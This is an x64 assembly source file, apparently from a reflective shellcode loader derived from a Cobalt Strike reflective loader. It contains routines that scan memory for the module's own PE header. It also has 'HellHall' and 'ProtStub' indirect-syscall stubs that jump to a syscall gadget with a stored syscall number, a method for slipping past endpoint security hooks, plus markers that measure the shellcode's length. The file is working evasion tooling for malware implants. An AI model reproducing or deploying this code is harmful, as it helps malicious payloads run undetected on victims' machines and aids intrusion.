
extern Entry

global Start
global GetRIP
global GetRIPE
global GetRIPEnd
global HellHall
global SetConfig
global KaynCaller
global ProtStub

section .text$A
    ; stack alignment + allocating stack space, then calling entrypoint apparently
    Start:
        push    rsi
        mov	rsi, rsp
        and	rsp, 0FFFFFFFFFFFFFFF0h

        sub	rsp, 020h
        call    Entry

        mov	rsp, rsi
        pop	rsi
    ret

section .text$B

    ; Shameless copied from Bobby Cooke CobaltStrikeReflectiveLoader (https://github.com/boku7/CobaltStrikeReflectiveLoader)

    ; I think this returns the addr of KaynCaller - dylan
    KaynCaller:
        call pop
        pop:
        pop rcx    

    ; I think this goes up to find DOS header and try to check if e_lfanew offset returns nt header - dylan
    loop:
        xor r11, r11                ; rbx -> r11
        mov r11d, 0x5A4D            ; ebx -> r11d
        dec rcx
        cmp r11w,  word ds:[ rcx ]  ; bx -> r11w
        jne loop
        xor rax, rax
        mov ax,  [ rcx + 0x3C ]
        add rax, rcx
        xor r11, r11
        add r11w,  0x4550             ; bx -> r11w
        cmp r11w,  word ds:[ rax ]    ; bx -> r11w
        jne loop
        mov rax, rcx
    ret

section .text$C
    GetRIP:
        call    retptr

    retptr:
        pop	rax
        sub	rax, 5
    ret

section .text$C
    SetConfig:
    	mov r10d, ecx           ; store the SSN in the r10d
        mov r11, rdx	        ; store the syscall gadget in r11
        ret

section .text$C
    HellHall:
        mov eax, r10d		           ; paste the SSN into the eax
        mov r10, rcx	               
        jmp r11		                   ; jumping to the syscall gadget
        ret
    ret

section .text$D
    ;
    ; typedef struct
    ; {
    ;    SIZE_T StackArgs;    // Indicates to the callback how many of the args to iterate through
    ;    PVOID Args[16];     // up to 16 in size
    ; } ProtStubArgs, *PProtStubArgs;
    ; ProtStub( &ProtStubArgs )
    ; The registers themselves are addresses, but putting brackets is basically getting their value it
    ProtStub:
        ; Let's store the StackCount in r12, and the base of our args in r13
        mov r12, [rcx]           ; Store the StackArgCount in the r12    
        mov r13, rcx             ; Store the address of the struct into r13
        add r13, 8               ; Increment by 8 so now r13 is the base of the array
        ; Lets move the first four args in now
        ; Doesn't matter if the values in the array are 0, cause unused registers being 0 doesn't do anything to the syscall
        mov rcx, [r13]
        mov rdx, [r13 + 0x8]
        mov r8, [r13 + 0x10]
        mov r9, [r13 + 0x18]
        ; Now iterate through the StackArgCount and shove shit on the stack. Thanks GPT
        arg_loop:
            cmp r12, 0           ; Compare r12 with zero
            jle loop_end         ; If r12 <= 0, jump to loop_end
            dec r12              ; decrement
            mov rax, qword [r13 + 0x20 + 0x8 * r12] ; push [r13 + 0x28 + 0x8 * r12]. Thanks Mung for sanity checkin my shitty math
            push rax
        jmp arg_loop ; Jump back to loop_start
        loop_end:

        sub rsp, 020h                ; Now the 5th argument/whatever will be at the right offset

        mov eax, r10d		         ; paste the SSN into the eax
        mov r10, rcx	             ; normal syscall shit
        call r11		             ; jumping to the syscall gadget. return back to us so i can do some janky "fixes" HAHAHAHA

        add rsp, 028h                ; Fixing it so shit doesn't blow up
        ret
    ret

; Random function at E to determine length of ProtStub 
section .text$E
    GetRIPE:
        call    retptr
    ret

; Random function at the end (5 bytes long) to determine the end of the shellcode
section .text$END
    GetRIPEnd:
        ret
